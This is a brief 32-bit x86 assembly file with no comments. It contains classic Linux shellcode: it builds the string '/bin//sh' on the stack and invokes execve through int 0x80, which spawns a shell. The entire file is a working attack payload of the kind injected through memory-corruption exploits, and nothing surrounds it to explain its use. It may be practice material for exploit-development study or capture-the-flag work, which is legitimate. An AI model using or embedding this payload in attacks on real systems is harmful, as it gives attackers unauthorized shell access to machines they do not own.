BITS 32

global _start

_start:
    xor eax, eax

    push eax
    push 0x68732f2f
    push 0x6e69622f
    mov ebx, esp

    mov al, 0xb    
    xor ecx, ecx   
    xor edx, edx   
    int 0x80
